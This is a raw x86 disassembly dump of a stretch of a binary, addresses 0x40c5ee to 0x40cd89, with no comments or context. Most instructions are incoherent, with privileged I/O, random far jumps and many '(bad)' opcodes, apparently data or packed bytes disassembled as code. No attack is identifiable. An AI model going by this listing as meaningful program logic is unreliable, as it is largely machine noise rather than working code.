  40c5ee:	aaa    
  40c5ef:	mul    BYTE PTR [esp+ebp*1]
  40c5f2:	popf   
  40c5f3:	stos   DWORD PTR es:[edi],eax
  40c5f4:	and    ch,al
  40c5f6:	jl     0x40c613
  40c5f8:	cmp    eax,edx
  40c5fa:	out    0x82,al
  40c5fc:	jmp    0xd8455ef3
  40c601:	mov    al,BYTE PTR [ecx-0xe1a8055]
  40c607:	out    dx,eax
  40c608:	inc    ecx
  40c609:	jb     0x40c5f9
  40c60b:	mov    ch,0xdf
  40c60d:	retf   
  40c60e:	psadbw mm0,QWORD PTR [ecx-0x18]
  40c612:	xor    bh,BYTE PTR [eax+edi*8+0x4f]
  40c616:	stos   BYTE PTR es:[edi],al
  40c617:	mov    cl,0x8a
  40c619:	pop    es
  40c61a:	lea    ecx,[edx-0x18]
  40c61d:	ss inc edi
  40c61f:	jecxz  0x40c641
  40c621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c622:	sbb    bh,BYTE PTR [ecx]
  40c624:	repnz dec edx
  40c626:	or     bl,BYTE PTR [ebp-0x26]
  40c629:	ds cli 
  40c62b:	pop    esi
  40c62c:	test   al,0xf9
  40c62e:	sahf   
  40c62f:	shl    BYTE PTR [esi-0x4d87f50],0x97
  40c636:	shr    DWORD PTR [ebp-0x74],cl
  40c639:	or     bh,al
  40c63b:	dec    ecx
  40c63c:	mov    BYTE PTR [esi-0x167b29f0],dh
  40c642:	add    BYTE PTR [ebx],cl
  40c644:	cdq    
  40c645:	mov    edx,0x49dc3300
  40c64a:	test   al,0x5d
  40c64c:	dec    ebp
  40c64d:	scas   al,BYTE PTR es:[edi]
  40c64e:	mov    eax,ds:0x2bf86432
  40c653:	push   esi
  40c654:	add    eax,0x6884edb9
  40c659:	jb     0x40c5df
  40c65b:	sub    BYTE PTR [ecx],al
  40c65d:	int    0xc0
  40c65f:	mov    esp,DWORD PTR [esi]
  40c661:	sti    
  40c662:	imul   ebx,edi,0xa04f18f1
  40c668:	sbb    eax,edx
  40c66a:	inc    edx
  40c66b:	or     eax,ebp
  40c66d:	add    cl,bh
  40c66f:	mov    bl,0x7
  40c671:	loope  0x40c63e
  40c673:	clc    
  40c674:	jge    0x40c66b
  40c676:	mov    DWORD PTR [esp+ebx*4],edx
  40c679:	push   ds
  40c67a:	xor    al,0xa9
  40c67c:	rcl    DWORD PTR [edx+0x1c],1
  40c67f:	fwait
  40c680:	jnp    0x40c626
  40c682:	(bad)  
  40c683:	js     0x40c64f
  40c685:	mov    bh,0x28
  40c687:	push   es
  40c688:	fbld   TBYTE PTR [eax]
  40c68a:	div    edi
  40c68c:	fdiv   st(0),st
  40c68e:	sub    DWORD PTR [edx],eax
  40c690:	jmp    0xacda15f5
  40c695:	cld    
  40c696:	inc    esp
  40c697:	cmp    dl,BYTE PTR [esi]
  40c699:	push   ecx
  40c69a:	sub    DWORD PTR [edx],esi
  40c69c:	call   0x23f:0xf3c6608a
  40c6a3:	mov    ebp,0x6be2d1c9
  40c6a8:	not    DWORD PTR [esi-0x1fc3c435]
  40c6ae:	ins    DWORD PTR es:[edi],dx
  40c6af:	(bad)  
  40c6b0:	popf   
  40c6b1:	bound  ecx,QWORD PTR ds:0xa8589782
  40c6b7:	mov    cl,0x60
  40c6b9:	enter  0xde3b,0x34
  40c6bd:	pop    ebp
  40c6be:	cld    
  40c6bf:	lods   eax,DWORD PTR ds:[esi]
  40c6c0:	not    BYTE PTR [eax-0x9]
  40c6c3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40c6c5:	push   esp
  40c6c6:	add    eax,0xb0720083
  40c6cb:	out    dx,eax
  40c6cc:	addr16 ror edx,1
  40c6cf:	leave  
  40c6d0:	xlat   BYTE PTR ds:[ebx]
  40c6d1:	pop    edi
  40c6d2:	fldenv [edx]
  40c6d4:	cmp    edx,DWORD PTR [edx-0x3e319642]
  40c6da:	gs xchg edi,eax
  40c6dc:	cmp    ebx,ebx
  40c6de:	pop    ecx
  40c6df:	cld    
  40c6e0:	retf   0x4aee
  40c6e3:	jle    0x40c687
  40c6e5:	into   
  40c6e6:	aaa    
  40c6e7:	xor    al,0x27
  40c6e9:	enter  0x7d8a,0x29
  40c6ed:	pop    esp
  40c6ee:	rcl    DWORD PTR [esi],1
  40c6f0:	lock icebp 
  40c6f2:	loope  0x40c69e
  40c6f4:	jmp    0x3d4f:0x84de8528
  40c6fb:	out    0x12,al
  40c6fd:	repnz pop edi
  40c6ff:	test   eax,0xa293f143
  40c704:	xchg   ebp,ebp
  40c706:	test   ah,bl
  40c708:	test   edx,0x698869a6
  40c70e:	retf   
  40c70f:	jmp    0x249dbf4b
  40c714:	cwde   
  40c715:	sub    esi,0xeb6c7eef
  40c71b:	test   BYTE PTR ds:0x8902a5a8,0x33
  40c722:	repz cld 
  40c724:	dec    esi
  40c725:	and    edx,DWORD PTR [ecx+0x21cb54ec]
  40c72b:	mov    bh,0x61
  40c72d:	add    BYTE PTR [edx],0xcb
  40c730:	outs   dx,BYTE PTR ds:[esi]
  40c731:	test   al,0x8
  40c733:	mov    al,ds:0x36ca9b59
  40c738:	sahf   
  40c739:	(bad)
  40c73c:	mov    ecx,0xe02e1a4b
  40c741:	das    
  40c742:	sbb    BYTE PTR [esi],dl
  40c744:	stos   BYTE PTR es:[edi],al
  40c745:	jb     0x40c703
  40c747:	and    DWORD PTR [ebp-0x24ba47d1],esi
  40c74d:	mov    al,0x42
  40c74f:	in     eax,dx
  40c750:	cmp    ecx,eax
  40c752:	in     al,0xfc
  40c754:	dec    edi
  40c755:	push   0x5a
  40c757:	add    ebx,DWORD PTR [eax+0x369e2e58]
  40c75d:	ins    DWORD PTR es:[edi],dx
  40c75e:	pop    ds
  40c75f:	dec    ebx
  40c760:	mov    ebp,0xb4e34fdc
  40c765:	mov    BYTE PTR [ecx+0x1bfd3ca4],cl
  40c76b:	addr16 mov edi,0xdd012a0e
  40c771:	lahf   
  40c772:	sub    esi,ebp
  40c774:	js     0x40c772
  40c776:	hlt    
  40c777:	pop    eax
  40c778:	out    0x34,eax
  40c77a:	(bad)  
  40c77b:	out    0xea,eax
  40c77d:	ds xor dl,0x64
  40c781:	cmp    al,0x74
  40c783:	(bad)  
  40c784:	adc    BYTE PTR [edx-0x3a],dh
  40c787:	je     0x40c751
  40c789:	pop    eax
  40c78a:	kunpckbw k1,k3,k1
  40c78e:	sbb    dh,BYTE PTR [eax]
  40c790:	jnp    0x40c7f9
  40c792:	add    cl,bl
  40c794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c795:	imul   ebx,DWORD PTR [edi+0x1ee7486b],0x124fe528
  40c79f:	cmp    eax,0x7e503a9a
  40c7a4:	push   ds
  40c7a5:	inc    edx
  40c7a6:	xchg   esp,eax
  40c7a8:	idiv   DWORD PTR [ebp-0x24239314]
  40c7ae:	(bad)  
  40c7af:	cld    
  40c7b0:	mov    al,ds:0x7ba6af6
  40c7b5:	rcr    BYTE PTR [esi+0xd7c5ae3],cl
  40c7bb:	inc    esp
  40c7bc:	retf   0x9ae5
  40c7bf:	push   esi
  40c7c1:	sbb    ax,0x6e9f
  40c7c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7c6:	into   
  40c7c7:	mov    eax,0xcb6dd02d
  40c7cc:	test   BYTE PTR [eax],cl
  40c7ce:	xchg   esp,eax
  40c7cf:	call   0x9797:0x3c0a4b95
  40c7d6:	cld    
  40c7d7:	adc    ch,BYTE PTR [eax+0x462a658b]
  40c7dd:	lds    ebp,FWORD PTR [eax]
  40c7df:	loopne 0x40c84f
  40c7e1:	(bad)  
  40c7e2:	(bad)  
  40c7e3:	sub    eax,0xa8c5e9f1
  40c7e8:	outs   dx,DWORD PTR ds:[esi]
  40c7e9:	push   ds
  40c7ea:	cmc    
  40c7eb:	pmullw mm2,QWORD PTR [esp+eiz*8]
  40c7ef:	mov    ds:0x8d39fb9,al
  40c7f4:	and    al,0x4a
  40c7f6:	mov    al,0x11
  40c7f8:	mov    edx,0x84fb6cf5
  40c7fd:	dec    ebx
  40c7fe:	xchg   ebp,eax
  40c7ff:	jne    0x40c812
  40c801:	dec    ebx
  40c802:	in     eax,0x61
  40c804:	cmp    edi,DWORD PTR [eax]
  40c806:	adc    DWORD PTR [edx-0x29],esp
  40c809:	sub    esi,DWORD PTR [bp+si-0xa01]
  40c80e:	jp     0x40c850
  40c810:	test   DWORD PTR [ebp-0x30e2238d],eax
  40c816:	mov    eax,0x21bf0ca
  40c81b:	adc    bl,al
  40c81d:	sub    dh,bl
  40c81f:	add    al,dh
  40c821:	into   
  40c822:	call   0x24e4:0x3f39b2ed
  40c829:	add    ebp,DWORD PTR [edx]
  40c82b:	ret    
  40c82c:	outs   dx,DWORD PTR ds:[esi]
  40c82d:	cli    
  40c82e:	retf   
  40c82f:	and    BYTE PTR [ebx+0x60],bh
  40c832:	mov    ds:0x80a69ae2,al
  40c837:	les    esp,FWORD PTR [eax]
  40c839:	mov    ecx,0x34ef108b
  40c83e:	sbb    BYTE PTR [edx-0x55863e36],0x2b
  40c845:	(bad)  [ecx+0x48fea750]
  40c84b:	jnp    0x40c8cb
  40c84d:	or     dh,BYTE PTR [ecx+0x422902aa]
  40c853:	pop    edx
  40c854:	mov    ecx,0x3d68bb3
  40c859:	jmp    0x40c895
  40c85b:	jmp    0x40c7e1
  40c85d:	cmp    BYTE PTR [eax+0x3d],al
  40c860:	mov    edi,0xad75b003
  40c865:	fist   DWORD PTR es:[esi]
  40c868:	mov    bh,0xbc
  40c86a:	sbb    cl,0x50
  40c86d:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40c874:	mov    DWORD PTR [ebp-0x1c],0x718f
  40c87b:	mov    eax,DWORD PTR [ebp-0x20]
  40c87e:	jmp    0x40cc89
  40c883:	(bad)  
  40c884:	fisubr DWORD PTR [edx+0x36]
  40c887:	mov    esp,0x55fc93b6
  40c88c:	or     eax,0xd0a8e3ac
  40c891:	ror    edi,0xe9
  40c894:	xlat   BYTE PTR ds:[ebx]
  40c895:	mov    esi,0xbec492be
  40c89a:	mov    esi,0xc3da2ead
  40c89f:	fld    DWORD PTR [ebp+0x47dd6805]
  40c8a5:	cdq    
  40c8a6:	mov    bl,0xa2
  40c8a8:	mov    edi,0xcce5d2af
  40c8ad:	or     cl,ah
  40c8af:	mov    cl,0xc9
  40c8b1:	outs   dx,BYTE PTR ds:[esi]
  40c8b2:	mov    ds:0x6c09795d,al
  40c8b7:	imul   DWORD PTR ds:[ebp-0x5a0cad92]
  40c8be:	push   eax
  40c8bf:	lock es (bad) 
  40c8c3:	call   0xa5df:0xa041439c
  40c8ca:	gs ret 0x4cc1
  40c8ce:	lahf   
  40c8cf:	add    BYTE PTR [edi+0x6c],cl
  40c8d2:	sub    bh,dh
  40c8d4:	pop    esp
  40c8d5:	cld    
  40c8d6:	and    edi,DWORD PTR [ecx-0x27517234]
  40c8dc:	jmp    0x40c936
  40c8de:	or     DWORD PTR [esi],esi
  40c8e0:	pop    esp
  40c8e1:	cmp    BYTE PTR [ebp+esi*4+0x5bd07ccf],bl
  40c8e8:	xchg   DWORD PTR [edx-0x6f],ecx
  40c8eb:	repz xor eax,0xd7769f1b
  40c8f1:	dec    ebp
  40c8f2:	out    dx,eax
  40c8f3:	mov    ebp,0x11a59793
  40c8f8:	xor    BYTE PTR [edx],ch
  40c8fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8fb:	idiv   BYTE PTR [ebp-0x239695b5]
  40c901:	add    DWORD PTR [ebx+0x68],0x3f0d3eed
  40c908:	dec    esp
  40c909:	stos   DWORD PTR es:[edi],eax
  40c90a:	dec    edi
  40c90b:	adc    edx,ebx
  40c90d:	dec    ecx
  40c90e:	jl     0x40c8ff
  40c910:	add    BYTE PTR ds:[eax],al
  40c913:	inc    esi
  40c914:	push   0x745dfc67
  40c919:	cmp    al,0xc2
  40c91b:	iret   
  40c91c:	mov    dl,0x50
  40c91e:	lahf   
  40c91f:	adc    BYTE PTR [edi-0x5f],bl
  40c922:	ins    DWORD PTR es:[edi],dx
  40c923:	add    edx,DWORD PTR [ebx+0x48]
  40c926:	and    eax,0x52538a85
  40c92b:	cmp    bh,0xbf
  40c92e:	lods   al,BYTE PTR ds:[esi]
  40c92f:	lock call 0x1b5731c3
  40c935:	pop    ebx
  40c936:	stc    
  40c937:	or     ebx,DWORD PTR [ebx-0x46]
  40c93a:	mov    dh,0x6c
  40c93c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c93d:	fist   DWORD PTR [ebp-0x5a]
  40c940:	inc    esp
  40c941:	xchg   BYTE PTR [edi-0x20f05a78],dl
  40c947:	out    dx,eax
  40c948:	ins    BYTE PTR es:[edi],dx
  40c949:	sbb    ebp,ebp
  40c94b:	stos   DWORD PTR es:[edi],eax
  40c94c:	mov    BYTE PTR [esi+0x2da3a219],ch
  40c952:	push   0xe44efde
  40c957:	stos   BYTE PTR es:[edi],al
  40c958:	cmc    
  40c959:	xor    edi,esi
  40c95b:	(bad)  [edi]
  40c95d:	mov    ebx,0x57b44eb9
  40c962:	(bad)  
  40c963:	out    dx,al
  40c964:	(bad)  
  40c965:	adc    al,0x1c
  40c967:	dec    eax
  40c968:	test   al,0x9b
  40c96a:	stc    
  40c96b:	or     al,0x59
  40c96d:	sbb    cl,dh
  40c96f:	or     eax,0x3cbf0533
  40c974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c975:	in     al,dx
  40c976:	ins    DWORD PTR es:[edi],dx
  40c977:	push   edx
  40c978:	scas   al,BYTE PTR es:[edi]
  40c979:	push   es
  40c97a:	pop    ebp
  40c97b:	fist   DWORD PTR [edi+eiz*4]
  40c97e:	test   BYTE PTR [eax-0x16],bl
  40c981:	inc    ebx
  40c982:	clc    
  40c983:	ss or  al,0x73
  40c986:	call   0xb4f7:0x43a1ba6c
  40c98d:	sbb    DWORD PTR [edi+0x2ca36d1d],edi
  40c993:	add    cl,dh
  40c995:	and    ah,BYTE PTR [edx]
  40c997:	mov    dl,0xc0
  40c999:	adc    BYTE PTR [ecx-0x4b7af7a1],ah
  40c99f:	jp     0x40c99d
  40c9a1:	ds mov ecx,0xa4d426a3
  40c9a7:	(bad)  
  40c9a8:	cmp    ebx,edi
  40c9aa:	retf   0xd3d6
  40c9ad:	inc    edi
  40c9ae:	mov    al,ds:0x2370b90
  40c9b3:	pop    ds
  40c9b4:	mov    ecx,0x42126d8e
  40c9b9:	(bad)  
  40c9ba:	mov    al,0xe5
  40c9bc:	mov    ebp,0xa4166e0b
  40c9c1:	lds    ebp,FWORD PTR [edx]
  40c9c3:	repnz fcom st(3)
  40c9c6:	repz rcl ebp,cl
  40c9c9:	xor    DWORD PTR [edx],edx
  40c9cb:	push   esi
  40c9cc:	push   ecx
  40c9cd:	stos   DWORD PTR es:[edi],eax
  40c9ce:	pop    ecx
  40c9cf:	and    al,0x15
  40c9d1:	add    edx,edi
  40c9d3:	push   edx
  40c9d4:	outs   dx,DWORD PTR ds:[esi]
  40c9d5:	add    ch,dl
  40c9d7:	popf   
  40c9d8:	add    ah,BYTE PTR [eax-0x61e262c3]
  40c9de:	push   esi
  40c9df:	cmp    ebp,DWORD PTR [edx+0xd]
  40c9e2:	jno    0x40c9df
  40c9e4:	mov    edi,0xcc28df82
  40c9e9:	or     al,0x34
  40c9eb:	daa    
  40c9ec:	mov    ds:0xdb13b261,al
  40c9f1:	pop    ecx
  40c9f2:	push   ebp
  40c9f3:	ror    DWORD PTR [ebp+edi*4+0x4950ff55],cl
  40c9fa:	and    dl,al
  40c9fc:	dec    ecx
  40c9fd:	iret   
  40c9fe:	push   eax
  40c9ff:	jg     0x40ca46
  40ca01:	pop    ds
  40ca02:	loop   0x40c9a6
  40ca04:	pop    ebx
  40ca05:	sbb    eax,0x4761f06f
  40ca0a:	push   ecx
  40ca0b:	(bad)  
  40ca0d:	in     al,dx
  40ca0e:	sbb    eax,0x87a5bd55
  40ca13:	pusha  
  40ca14:	inc    esp
  40ca15:	dec    esp
  40ca16:	lock jg 0x40c9e9
  40ca19:	push   ss
  40ca1a:	cmc    
  40ca1b:	cmc    
  40ca1c:	out    0x28,al
  40ca1e:	in     eax,dx
  40ca1f:	adc    edx,DWORD PTR [ecx]
  40ca21:	cmp    ah,BYTE PTR [ebx+0x14890bf1]
  40ca27:	and    edx,0x299a4402
  40ca2d:	das    
  40ca2e:	jp     0x40ca18
  40ca30:	add    BYTE PTR [ecx],0x58
  40ca33:	pusha  
  40ca34:	repnz sbb al,0x41
  40ca37:	aas    
  40ca38:	iret   
  40ca39:	leave  
  40ca3a:	mov    es:0x7a15423e,al
  40ca40:	inc    edx
  40ca41:	mov    bl,0xe0
  40ca43:	cld    
  40ca44:	cwde   
  40ca45:	in     al,0xee
  40ca47:	xor    BYTE PTR [ebp+0x515dad10],0x65
  40ca4e:	inc    ebp
  40ca4f:	xor    BYTE PTR [edx-0x50],0x1e
  40ca53:	sub    BYTE PTR [edi-0x7],dh
  40ca56:	fnstsw WORD PTR [eax+0x1377614d]
  40ca5c:	jno    0x40ca98
  40ca5e:	loop   0x40ca2d
  40ca60:	fst    DWORD PTR [ebp+0x290f6bc8]
  40ca66:	push   edx
  40ca67:	out    0xd9,eax
  40ca69:	in     eax,0x6
  40ca6b:	push   edx
  40ca6c:	dec    esi
  40ca6d:	imul   edx,DWORD PTR [ebx-0x18],0x40b0065d
  40ca74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca75:	fmul   DWORD PTR [ecx]
  40ca77:	or     esi,DWORD PTR [ebx+0x2c]
  40ca7a:	inc    ebx
  40ca7b:	xor    DWORD PTR [edx],ecx
  40ca7d:	scas   eax,DWORD PTR es:[edi]
  40ca7e:	cld    
  40ca7f:	jg     0x40ca3a
  40ca81:	rcr    ebx,1
  40ca83:	dec    ebp
  40ca84:	xor    eax,0xd82f6eab
  40ca89:	int    0x97
  40ca8b:	hlt    
  40ca8c:	pop    esi
  40ca8d:	mov    edx,0x1d9acc3
  40ca92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca93:	sbb    edi,DWORD PTR [esi-0x7a865284]
  40ca99:	pop    ecx
  40ca9a:	addr16 out 0x8e,al
  40ca9d:	pop    eax
  40ca9e:	sahf   
  40ca9f:	push   esp
  40caa0:	sub    al,0x77
  40caa2:	pusha  
  40caa3:	push   ebp
  40caa4:	mov    WORD PTR [esp+esi*2-0xb],es
  40caa8:	mov    esi,0xb8afd5cf
  40caad:	repz dec edx
  40caaf:	ret    
  40cab0:	arpl   sp,dx
  40cab2:	xchg   ebx,eax
  40cab3:	adc    al,0xab
  40cab5:	call   0xef9ee2cc
  40caba:	loop   0x40caf0
  40cabc:	sub    eax,0xfeb158a6
  40cac1:	js     0x40cab9
  40cac3:	or     bh,bl
  40cac5:	jne    0x40ca8a
  40cac7:	adc    DWORD PTR [esi],0xf8c45106
  40cacd:	iret   
  40cace:	retf   
  40cacf:	pop    ecx
  40cad0:	and    al,0x1a
  40cad2:	aas    
  40cad3:	add    eax,0x8e34bd3c
  40cad8:	mov    cl,0x3a
  40cada:	je     0x40caa3
  40cadc:	push   ebx
  40cadd:	mov    ecx,0x48fa3c00
  40cae2:	xchg   edi,eax
  40cae3:	pop    esp
  40cae4:	stc    
  40cae5:	xlat   BYTE PTR ds:[ebx]
  40cae6:	retf   0x1d30
  40cae9:	push   ds
  40caea:	aas    
  40caeb:	dec    esi
  40caec:	addr16 xor al,0x42
  40caef:	sar    DWORD PTR [eax],0x8b
  40caf2:	test   eax,0xdb58b2e
  40caf7:	or     edi,ebx
  40caf9:	jns    0x40cb15
  40cafb:	jecxz  0x40cafd
  40cafd:	pop    esp
  40cafe:	and    esi,DWORD PTR fs:[ebx+edi*1+0x3192b49f]
  40cb06:	cli    
  40cb07:	adc    dl,cl
  40cb09:	jmp    0xfb6a:0xf7ad5ea4
  40cb10:	daa    
  40cb11:	add    bh,BYTE PTR [ecx-0x51]
  40cb14:	or     cl,ah
  40cb16:	fwait
  40cb17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb18:	or     eax,0xa2a58a4
  40cb1d:	xor    BYTE PTR [ecx-0x1e],bl
  40cb20:	mov    edx,0xd5191481
  40cb25:	jl     0x40cb94
  40cb27:	fldenv [esi]
  40cb29:	cmp    ch,BYTE PTR [eax+esi*4]
  40cb2c:	rcl    DWORD PTR [ebp+0x5b],1
  40cb2f:	std    
  40cb30:	es repnz (bad) 
  40cb33:	sbb    ah,BYTE PTR [ebx+0x9]
  40cb36:	jmp    0x1f7681b5
  40cb3b:	aas    
  40cb3c:	lods   eax,DWORD PTR ds:[esi]
  40cb3d:	sti    
  40cb3e:	rcl    BYTE PTR [ecx+0x27],0xdf
  40cb42:	sub    BYTE PTR [ebp+0x57c5dbf1],dl
  40cb48:	jl     0x40cb46
  40cb4a:	inc    ebp
  40cb4b:	jmp    0xc395:0x8e238c3d
  40cb52:	idiv   BYTE PTR [ebx]
  40cb54:	or     al,0x1b
  40cb56:	daa    
  40cb57:	xchg   edi,eax
  40cb58:	int3   
  40cb59:	push   edi
  40cb5a:	push   ss
  40cb5b:	pop    edi
  40cb5c:	arpl   WORD PTR [eax-0x543c983e],di
  40cb62:	adc    eax,0xb03c04e3
  40cb67:	xchg   BYTE PTR ds:0xa219926e,cl
  40cb6d:	in     al,dx
  40cb6e:	call   0xbf23:0x6f783f0
  40cb75:	jo     0x40cb6e
  40cb77:	outs   dx,BYTE PTR ds:[esi]
  40cb78:	fcom   st(7)
  40cb7a:	sti    
  40cb7b:	(bad)  
  40cb7c:	ret    0xec54
  40cb7f:	fwait
  40cb80:	in     eax,dx
  40cb81:	in     eax,0xfa
  40cb83:	sti    
  40cb84:	sub    eax,0x5ec482ba
  40cb89:	sbb    DWORD PTR [esi+edi*1-0x4],esp
  40cb8d:	(bad)  
  40cb8e:	clc    
  40cb8f:	mov    ecx,0xc1c834fb
  40cb94:	js     0x40cb90
  40cb96:	mov    eax,0x8df20c4
  40cb9b:	or     BYTE PTR ds:0x2a1d03ed,bl
  40cba1:	cld    
  40cba2:	or     edx,eax
  40cba4:	call   0x4685e386
  40cba9:	mov    ebp,0x44e5cc5d
  40cbae:	mov    al,ds:0xa7a9f171
  40cbb3:	push   esp
  40cbb4:	adc    eax,DWORD PTR [ecx+eax*2-0x52dbd812]
  40cbbb:	fild   QWORD PTR [eax+ecx*2]
  40cbbe:	imul   edi,DWORD PTR [edx+eax*1],0xffffffd7
  40cbc2:	mov    al,0x1c
  40cbc4:	lds    ebp,FWORD PTR [esi-0x47]
  40cbc7:	jecxz  0x40cb9e
  40cbc9:	pop    es
  40cbca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbcb:	sub    al,bl
  40cbcd:	sbb    ah,al
  40cbcf:	arpl   WORD PTR [edx-0x5fe142b8],bp
  40cbd5:	pusha  
  40cbd6:	sub    edx,esp
  40cbd8:	stos   BYTE PTR es:[edi],al
  40cbd9:	arpl   dx,dx
  40cbdb:	sub    eax,0x2501dbbf
  40cbe0:	fs aaa 
  40cbe2:	xor    al,0x70
  40cbe4:	xchg   ecx,eax
  40cbe5:	out    0xc,eax
  40cbe7:	lods   al,BYTE PTR ds:[esi]
  40cbe8:	xor    esp,esi
  40cbea:	or     ah,ch
  40cbec:	jae    0x40cc5e
  40cbee:	mov    ds:0x342304ce,al
  40cbf3:	jge    0x40cb82
  40cbf5:	pop    esp
  40cbf6:	mov    ch,0xa1
  40cbf8:	adc    eax,0xb679f832
  40cbfd:	aam    0x48
  40cbff:	xor    cl,BYTE PTR [edi+eax*4+0x68aa4250]
  40cc06:	stos   BYTE PTR es:[edi],al
  40cc07:	not    DWORD PTR [ebp+0x5e]
  40cc0a:	int    0xbc
  40cc0c:	adc    al,0x9b
  40cc0e:	out    dx,al
  40cc0f:	clc    
  40cc10:	test   eax,0xbde1dbcc
  40cc15:	int3   
  40cc16:	jns    0x40cbe9
  40cc18:	scas   al,BYTE PTR es:[edi]
  40cc19:	stc    
  40cc1a:	sub    DWORD PTR [edx-0x2ab658c9],ecx
  40cc20:	je     0x40cbe7
  40cc22:	jl     0x40cc06
  40cc24:	xchg   ecx,eax
  40cc25:	jo     0x40cc96
  40cc27:	adc    BYTE PTR [eax-0x27],cl
  40cc2a:	scas   eax,DWORD PTR es:[edi]
  40cc2b:	mov    ch,0x3c
  40cc2d:	mov    esi,0xcf9d7723
  40cc32:	je     0x40cbc1
  40cc34:	inc    edx
  40cc35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc36:	sub    BYTE PTR [edi],bl
  40cc38:	les    ebx,FWORD PTR [eax+0x2696284]
  40cc3e:	push   cs
  40cc3f:	push   0x219a4f7
  40cc44:	add    al,0x2f
  40cc46:	mov    BYTE PTR [ecx+0x6a],dh
  40cc49:	aam    0x5a
  40cc4b:	les    ecx,FWORD PTR [eax+0x63ed8911]
  40cc51:	(bad)  
  40cc52:	repz out dx,eax
  40cc54:	pushf  
  40cc55:	mov    ds:0x80095763,eax
  40cc5a:	arpl   WORD PTR [eax+0x7568783f],dx
  40cc60:	mov    al,ds:0x7d489618
  40cc65:	push   0x2f
  40cc67:	xchg   DWORD PTR [esi],esi
  40cc69:	(bad)  
  40cc6a:	shr    DWORD PTR [ecx],cl
  40cc6c:	inc    BYTE PTR [eax]
  40cc6e:	inc    edi
  40cc6f:	push   esp
  40cc70:	inc    esi
  40cc71:	jmp    0x30ddb0ce
  40cc76:	fisub  DWORD PTR [ecx-0xf58412d]
  40cc7c:	xor    eax,0xd6fe3cec
  40cc81:	mov    ebp,DWORD PTR [esi]
  40cc83:	stos   DWORD PTR es:[edi],eax
  40cc84:	or     esp,DWORD PTR gs:[ebp-0x44]
  40cc88:	fimul  DWORD PTR [ebx+0x758be455]
  40cc8e:	fmul   DWORD PTR [ebx+0x4805dc5d]
  40cc94:	leave  
  40cc95:	(bad)  
  40cc96:	inc    DWORD PTR [ecx-0x784f2e]
  40cc9c:	dec    DWORD PTR [ebx]
  40cc9e:	(bad)  
  40cc9f:	mov    esi,DWORD PTR [ebp-0x40]
  40cca2:	or     eax,esi
  40cca4:	or     edx,ebx
  40cca6:	mov    ebx,DWORD PTR [ebp-0x3c]
  40cca9:	mov    esi,DWORD PTR [ebp-0x38]
  40ccac:	or     edx,ebx
  40ccae:	mov    ebx,DWORD PTR [ebp-0x34]
  40ccb1:	sub    eax,esi
  40ccb3:	mov    esi,DWORD PTR [ebp-0x48]
  40ccb6:	sbb    edx,ebx
  40ccb8:	mov    ebx,DWORD PTR [ebp-0x44]
  40ccbb:	or     eax,esi
  40ccbd:	or     edx,ebx
  40ccbf:	add    eax,0x89b
  40ccc4:	jmp    0x40d0cf
  40ccc9:	popf   
  40ccca:	call   0xbabc:0x1b7c1940
  40ccd1:	pop    eax
  40ccd2:	out    0xe9,eax
  40ccd4:	jecxz  0x40cd53
  40ccd6:	pop    ds
  40ccd7:	mov    ebp,0xbedfbdcf
  40ccdc:	mov    esi,0xbebec492
  40cce1:	adc    eax,0xf1c3ca71
  40cce6:	and    DWORD PTR [edx+0x7f],edx
  40cce9:	mov    al,0xb4
  40cceb:	aad    0x56
  40cced:	dec    esi
  40ccee:	pop    edi
  40ccef:	jle    0x40cd1b
  40ccf1:	pop    esp
  40ccf2:	ror    BYTE PTR ds:0x914b6388,cl
  40ccf8:	pop    es
  40ccf9:	adc    eax,0xa324372e
  40ccfe:	icebp  
  40ccff:	jmp    0x40ccaf
  40cd01:	and    eax,0x7a206698
  40cd06:	mov    al,ds:0x136f771c
  40cd0b:	adc    ch,dl
  40cd0d:	sub    BYTE PTR [eax+edi*2-0xee64714],bh
  40cd14:	ret    
  40cd15:	adc    BYTE PTR [edx],0xd1
  40cd18:	outs   dx,DWORD PTR ds:[esi]
  40cd19:	repnz pop esp
  40cd1b:	popa   
  40cd1c:	jne    0x40cd4c
  40cd1e:	dec    ch
  40cd20:	and    eax,0x6aee9825
  40cd25:	mov    cl,0x91
  40cd27:	mov    bh,BYTE PTR [ebx-0x6f2c09e5]
  40cd2d:	sub    eax,0xe76ed023
  40cd32:	test   al,0xb0
  40cd34:	int    0xdd
  40cd36:	gs pop edi
  40cd38:	mov    WORD PTR [ebx],ss
  40cd3a:	int3   
  40cd3b:	dec    ecx
  40cd3c:	push   ss
  40cd3d:	cmp    ah,BYTE PTR [ebp-0x53fd5953]
  40cd43:	fiadd  DWORD PTR [ecx+0x1d26a7e2]
  40cd49:	fidiv  WORD PTR [edi+0x63df78ba]
  40cd4f:	cmp    edx,ecx
  40cd51:	dec    ecx
  40cd52:	cmp    BYTE PTR [ebp+esi*4+0x27be828a],dl
  40cd59:	std    
  40cd5a:	(bad)
  40cd5d:	adc    DWORD PTR [ebp+ecx*8-0xa],ebx
  40cd61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd62:	fild   QWORD PTR [eax-0x4]
  40cd65:	pop    ecx
  40cd66:	jae    0x40cdc2
  40cd68:	icebp  
  40cd69:	sti    
  40cd6a:	mov    esi,0xf455c3d6
  40cd6f:	rcl    DWORD PTR [esi+0x7faa7793],0x7d
  40cd76:	add    BYTE PTR [edx+0x6863cfbe],ch
  40cd7c:	outs   dx,DWORD PTR ds:[esi]
  40cd7d:	jnp    0x40cd1d
  40cd7f:	inc    ebp
  40cd80:	xchg   ebp,eax
  40cd81:	xchg   ecx,eax
  40cd82:	aad    0x9d
  40cd84:	fwait
  40cd85:	int3   
  40cd86:	xchg   edx,eax
  40cd87:	dec    ecx
  40cd88:	das    
  40cd89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
